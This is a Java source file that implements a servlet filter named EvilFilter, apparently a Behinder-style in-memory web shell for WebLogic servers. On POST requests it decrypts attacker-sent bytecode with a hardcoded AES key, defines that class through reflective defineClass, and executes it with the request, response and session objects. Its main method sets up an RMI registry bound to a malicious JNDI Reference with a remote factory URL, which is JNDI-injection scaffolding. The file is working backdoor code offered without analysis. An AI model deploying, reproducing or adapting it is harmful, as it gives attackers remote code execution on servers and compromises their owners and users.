
import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.*;
import javax.naming.Reference;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.sql.*;
import java.text.SimpleDateFormat;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

public class EvilFilter implements Filter{



    @Override
    public void init(FilterConfig filterConfig) throws ServletException {};

    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {

        try {

            if(((HttpServletRequest)request).getMethod().equals("POST")){
           // response.getOutputStream().write(new String("testa").getBytes());
            HttpSession session = ((HttpServletRequest)request).getSession();
            String k = "e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
            session.putValue("u", k);
            Cipher c = Cipher.getInstance("AES");
            c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
            HashMap map = new HashMap();
            map.put("request", request);
            map.put("response", ((weblogic.servlet.internal.ServletRequestImpl)request).getResponse());
            map.put("session", session);



            byte[] bytecode = java.util.Base64.getDecoder().decode("yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT");
            ClassLoader cl = (ClassLoader)Thread.currentThread().getContextClassLoader();
            java.lang.reflect.Method define = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            define.setAccessible(true);
            Class uclass = null;
            try{
                uclass = cl.loadClass("U");
            }catch(ClassNotFoundException e){
                uclass  = (Class)define.invoke(cl,bytecode,0,bytecode.length);
            }
            //Class uclass  = (Class)define.invoke(cl,bytecode,0,bytecode.length);
            Constructor constructor =  uclass.getDeclaredConstructor(ClassLoader.class);
            constructor.setAccessible(true);
            Object u = constructor.newInstance(this.getClass().getClassLoader());

            Method Um = uclass.getDeclaredMethod("g",byte[].class);
            Um.setAccessible(true);
            byte[] evilClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
            Class evilclass = (Class) Um.invoke(u,evilClassBytes);
            Object a = evilclass.newInstance();
            Method b = evilclass.getDeclaredMethod("equals",Object.class);
            b.setAccessible(true);
            b.invoke(a, map);
            return;

            }
        }catch(Exception ex){
            ex.printStackTrace();

        }
        chain.doFilter(request, response);

    }

    public static void main(String[] aa) throws Exception{
        Class c=EvilFilter.class;
        Object url=c.getProtectionDomain().getCodeSource().getLocation();
        ConcurrentHashMap<String, Class<?>> cachedClasses = new ConcurrentHashMap();
        cachedClasses.put("bb",String.class);
        cachedClasses.put("aa",int.class);
        Iterator it = cachedClasses.keySet().iterator();

        System.out.println(cachedClasses.keys());
       // System.out.println(javax.servlet.Filter.class.isAssignableFrom(EvilFilter.class));


        Registry registry = LocateRegistry.createRegistry(1099);

        String FactoryURL = "http://localhost:9999/";
        Reference reference = new Reference("EvilObj","EvilObj",FactoryURL);
        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
        registry.bind("EvilObj", wrapper);
    }
}
